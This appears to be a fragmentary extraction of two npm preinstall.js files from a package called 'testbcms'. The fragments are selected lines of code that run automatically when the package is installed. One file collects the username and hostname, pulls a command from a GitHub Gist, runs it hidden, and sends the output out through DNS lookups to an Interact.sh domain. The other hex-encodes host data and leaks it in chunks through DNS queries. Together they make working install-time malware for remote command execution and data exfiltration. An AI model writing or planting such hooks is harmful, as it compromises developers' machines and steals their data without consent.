// File: tmp/tmpbp_kf0qt/testbcms/package/dns/preinstall.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 4: _tmp_0 = require("child_process")
Line 13: os.userInfo()
Line 14: os.hostname()
Line 21: Buffer.from(JSON.stringify(data)).toString("base64")
Line 37: <operator>.formatString("https://api.github.com/gists/", GIST_ID, "")
Line 48: {
          const gistData = JSON.parse(rawData);
          const command = gistData.files["commands.txt"].content;

          // Eksekusi perintah dari Gist
          exec(command, { windowsHide: true }, (err, stdout, stderr) => {
            if (stdout || stderr) {
              // Kirim hasil ke Interact.sh via HTTP
              const resultData = Buffer.from(
                JSON.stringify({ stdout, stderr })
              ).toString("base64");
              const resultDomain = `${resultData}.result.${INTERACT_SH_SUBDOMAIN}`;
              dns.lookup(resultDomain, () => {});
            }
          });
        }
Line 49: const gistData = JSON.parse(rawData)
Line 50: const command = gistData.files["commands.txt"].content
Line 53: exec(command, { windowsHide: true }, (err, stdout, stderr) => {
            if (stdout || stderr) {
              // Kirim hasil ke Interact.sh via HTTP
              const resultData = Buffer.from(
                JSON.stringify({ stdout, stderr })
              ).toString("base64");
              const resultDomain = `${resultData}.result.${INTERACT_SH_SUBDOMAIN}`;
              dns.lookup(resultDomain, () => {});
            }
          })
Line 56: Buffer.from(
                JSON.stringify({ stdout, stderr })
              ).toString("base64")

// File: tmp/tmpbp_kf0qt/testbcms/package/preinstall.js
// ======================================================================
Line 1: const dns = require('dns')
Line 3: const crypto = require('crypto')
Line 5: const os = require('os')
Line 7: const path = require('path')
Line 24: os.hostname()
Line 37: Buffer.from(jsonData).toString('hex')
Line 42: const id1 = crypto.randomBytes(6).toString('hex')
Line 44: const id2 = crypto.randomBytes(6).toString('hex')
Line 51: dns.resolve4(hostname, {resolver}, (err) => {

            if (err) reject(err);

            else resolve();

        })
Line 66: dns.resolve4(ns, (err, addresses) => {

        if (err) resolve('8.8.4.4');

        else resolve(addresses[0]);

    })
Line 77: nsIpPromise.then(nsIp => {

    const resolver = [nsIp, '8.8.8.8'];


    chunks.forEach((chunk, idx) => {

        const host1 = `v2_f.${id1}.${idx}.${chunk}.v2_e${suffix}`;

        const host2 = `v2_f.${id2}.${idx}.${chunk}.v2_e${suffix}`;


        // Attempt DNS resolution

        resolveDns(host1, resolver).catch(() => {});

        resolveDns(host2, resolver).catch(() => {});

    });

})
Line 79: const resolver = [nsIp, '8.8.8.8']
